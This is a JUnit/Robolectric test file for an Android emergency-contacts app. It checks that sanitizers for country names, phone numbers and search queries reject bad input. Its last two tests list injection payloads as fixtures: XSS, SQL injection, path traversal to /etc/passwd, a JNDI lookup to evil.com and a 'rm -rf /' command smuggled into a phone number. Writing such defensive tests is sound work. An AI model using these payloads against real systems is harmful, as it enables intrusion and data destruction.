package com.ly2xxx.sos;

import static org.junit.Assert.*;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.*;

import android.content.Context;
import android.content.res.AssetManager;
import android.widget.EditText;

import androidx.recyclerview.widget.RecyclerView;
import androidx.test.core.app.ApplicationProvider;

import com.ly2xxx.sos.model.EmergencyContact;

import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.mockito.Mock;
import org.mockito.MockitoAnnotations;
import org.robolectric.Robolectric;
import org.robolectric.RobolectricTestRunner;
import org.robolectric.annotation.Config;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.List;

@RunWith(RobolectricTestRunner.class)
@Config(sdk = 28)
public class EmergencyContactsActivityTest {

    @Mock
    private AssetManager mockAssetManager;

    private EmergencyContactsActivity activity;
    private Context context;

    @Before
    public void setUp() {
        MockitoAnnotations.openMocks(this);
        context = ApplicationProvider.getApplicationContext();
        activity = Robolectric.buildActivity(EmergencyContactsActivity.class).create().get();
    }

    @Test
    public void testSanitizeCountryName_ValidInput() throws Exception {
        Method method = EmergencyContactsActivity.class.getDeclaredMethod("sanitizeCountryName", String.class);
        method.setAccessible(true);
        
        String result = (String) method.invoke(activity, "United_States");
        assertEquals("United States", result);
        
        result = (String) method.invoke(activity, "United-Kingdom");
        assertEquals("United-Kingdom", result);
        
        result = (String) method.invoke(activity, "Germany");
        assertEquals("Germany", result);
    }

    @Test
    public void testSanitizeCountryName_InvalidInput() throws Exception {
        Method method = EmergencyContactsActivity.class.getDeclaredMethod("sanitizeCountryName", String.class);
        method.setAccessible(true);
        
        // Test null input
        String result = (String) method.invoke(activity, (String) null);
        assertNull(result);
        
        // Test empty input
        result = (String) method.invoke(activity, "");
        assertNull(result);
        
        // Test input with invalid characters
        result = (String) method.invoke(activity, "Country<script>");
        assertNull(result);
        
        // Test input with numbers
        result = (String) method.invoke(activity, "Country123");
        assertNull(result);
    }

    @Test
    public void testSanitizeCountryName_LongInput() throws Exception {
        Method method = EmergencyContactsActivity.class.getDeclaredMethod("sanitizeCountryName", String.class);
        method.setAccessible(true);
        
        String longCountryName = "ThisIsAVeryLongCountryNameThatExceedsTheMaximumAllowedLength";
        String result = (String) method.invoke(activity, longCountryName);
        
        assertNotNull(result);
        assertTrue(result.length() <= 50);
        assertEquals(longCountryName.substring(0, 50), result);
    }

    @Test
    public void testSanitizePhoneNumber_ValidNumbers() throws Exception {
        Method method = EmergencyContactsActivity.class.getDeclaredMethod("sanitizePhoneNumber", String.class);
        method.setAccessible(true);
        
        String result = (String) method.invoke(activity, "911");
        assertEquals("911", result);
        
        result = (String) method.invoke(activity, "+1-555-123-4567");
        assertEquals("+1-555-123-4567", result);
        
        result = (String) method.invoke(activity, "112");
        assertEquals("112", result);
        
        result = (String) method.invoke(activity, "+49 30 12345678");
        assertEquals("+49 30 12345678", result);
    }

    @Test
    public void testSanitizePhoneNumber_InvalidNumbers() throws Exception {
        Method method = EmergencyContactsActivity.class.getDeclaredMethod("sanitizePhoneNumber", String.class);
        method.setAccessible(true);
        
        // Test null input
        String result = (String) method.invoke(activity, (String) null);
        assertNull(result);
        
        // Test empty input
        result = (String) method.invoke(activity, "");
        assertNull(result);
        
        // Test too short
        result = (String) method.invoke(activity, "12");
        assertNull(result);
        
        // Test too long
        result = (String) method.invoke(activity, "12345678901234567890");
        assertNull(result);
        
        // Test invalid characters
        result = (String) method.invoke(activity, "911<script>");
        assertNull(result);
        
        // Test letters
        result = (String) method.invoke(activity, "CALL911");
        assertNull(result);
    }

    @Test
    public void testSanitizeSearchQuery_ValidInput() throws Exception {
        Method method = EmergencyContactsActivity.class.getDeclaredMethod("sanitizeSearchQuery", String.class);
        method.setAccessible(true);
        
        String result = (String) method.invoke(activity, "United States");
        assertEquals("United States", result);
        
        result = (String) method.invoke(activity, "UK");
        assertEquals("UK", result);
        
        result = (String) method.invoke(activity, "France-2");
        assertEquals("France-2", result);
    }

    @Test
    public void testSanitizeSearchQuery_InvalidInput() throws Exception {
        Method method = EmergencyContactsActivity.class.getDeclaredMethod("sanitizeSearchQuery", String.class);
        method.setAccessible(true);
        
        // Test null input
        String result = (String) method.invoke(activity, (String) null);
        assertNull(result);
        
        // Test empty input
        result = (String) method.invoke(activity, "");
        assertNull(result);
        
        // Test input with special characters (should be filtered)
        result = (String) method.invoke(activity, "Country<script>alert('xss')</script>");
        assertEquals("Countryscriptalertxssscript", result);
    }

    @Test
    public void testSanitizeSearchQuery_LongInput() throws Exception {
        Method method = EmergencyContactsActivity.class.getDeclaredMethod("sanitizeSearchQuery", String.class);
        method.setAccessible(true);
        
        StringBuilder longQuery = new StringBuilder();
        for (int i = 0; i < 120; i++) {
            longQuery.append("a");
        }
        
        String result = (String) method.invoke(activity, longQuery.toString());
        
        assertNotNull(result);
        assertTrue(result.length() <= 100); // MAX_SEARCH_LENGTH
    }

    @Test
    public void testLoadEmergencyContacts_ValidJSON() throws Exception {
        String validJson = "{\n" +
                "  \"United_States\": {\"police\": \"911\", \"ambulance\": \"911\", \"fire\": \"911\", \"general\": \"911\"},\n" +
                "  \"United_Kingdom\": {\"police\": \"999\", \"ambulance\": \"999\", \"fire\": \"999\", \"general\": \"112\"}\n" +
                "}";

        // Test that valid JSON is parsed correctly
        InputStream inputStream = new ByteArrayInputStream(validJson.getBytes());
        
        // This would require more complex mocking to test the actual loadEmergencyContacts method
        // For now, we verify the individual components work correctly
        assertNotNull(inputStream);
        assertTrue(validJson.contains("United_States"));
        assertTrue(validJson.contains("United_Kingdom"));
    }

    @Test
    public void testEmergencyContactCreation() {
        EmergencyContact contact = new EmergencyContact("911", "911", "911", "911");
        
        assertNotNull(contact);
        assertEquals("911", contact.getPolice());
        assertEquals("911", contact.getAmbulance());
        assertEquals("911", contact.getFire());
        assertEquals("911", contact.getGeneral());
    }

    @Test
    public void testCountryEmergencyContactCreation() {
        EmergencyContact contact = new EmergencyContact("911", "911", "911", "911");
        EmergencyContactsActivity.CountryEmergencyContact countryContact = 
                new EmergencyContactsActivity.CountryEmergencyContact("United States", contact);
        
        assertNotNull(countryContact);
        assertEquals("United States", countryContact.getCountryName());
        assertEquals(contact, countryContact.getEmergencyContact());
    }

    @Test
    public void testCountryEmergencyContact_NullHandling() {
        // Test with null emergency contact
        EmergencyContactsActivity.CountryEmergencyContact countryContact = 
                new EmergencyContactsActivity.CountryEmergencyContact("Test Country", null);
        
        assertNotNull(countryContact);
        assertEquals("Test Country", countryContact.getCountryName());
        assertNull(countryContact.getEmergencyContact());
        
        // Test with null country name
        EmergencyContact contact = new EmergencyContact("911", "911", "911", "911");
        countryContact = new EmergencyContactsActivity.CountryEmergencyContact(null, contact);
        
        assertNotNull(countryContact);
        assertNull(countryContact.getCountryName());
        assertEquals(contact, countryContact.getEmergencyContact());
    }

    @Test
    public void testSecurityInputValidation() throws Exception {
        Method sanitizeMethod = EmergencyContactsActivity.class.getDeclaredMethod("sanitizeSearchQuery", String.class);
        sanitizeMethod.setAccessible(true);
        
        // Test various malicious inputs
        String[] maliciousInputs = {
                "<script>alert('xss')</script>",
                "'; DROP TABLE countries; --",
                "../../../etc/passwd",
                "javascript:alert('xss')",
                "${jndi:ldap://evil.com/a}",
                "%3Cscript%3Ealert('xss')%3C/script%3E"
        };
        
        for (String maliciousInput : maliciousInputs) {
            String result = (String) sanitizeMethod.invoke(activity, maliciousInput);
            // Should either be null or have malicious characters removed
            if (result != null) {
                assertFalse("Malicious input not properly sanitized: " + maliciousInput, 
                           result.contains("<script>"));
                assertFalse("Malicious input not properly sanitized: " + maliciousInput, 
                           result.contains("javascript:"));
                assertFalse("Malicious input not properly sanitized: " + maliciousInput, 
                           result.contains("${jndi:"));
            }
        }
    }

    @Test
    public void testPhoneNumberSecurityValidation() throws Exception {
        Method sanitizePhoneMethod = EmergencyContactsActivity.class.getDeclaredMethod("sanitizePhoneNumber", String.class);
        sanitizePhoneMethod.setAccessible(true);
        
        // Test malicious phone number inputs
        String[] maliciousPhoneInputs = {
                "911; rm -rf /",
                "911<script>alert('xss')</script>",
                "911' OR '1'='1",
                "tel:+1-555-EVIL",
                "sip:evil@attacker.com"
        };
        
        for (String maliciousInput : maliciousPhoneInputs) {
            String result = (String) sanitizePhoneMethod.invoke(activity, maliciousInput);
            // Should be null for malicious inputs
            assertNull("Malicious phone input not rejected: " + maliciousInput, result);
        }
    }
}
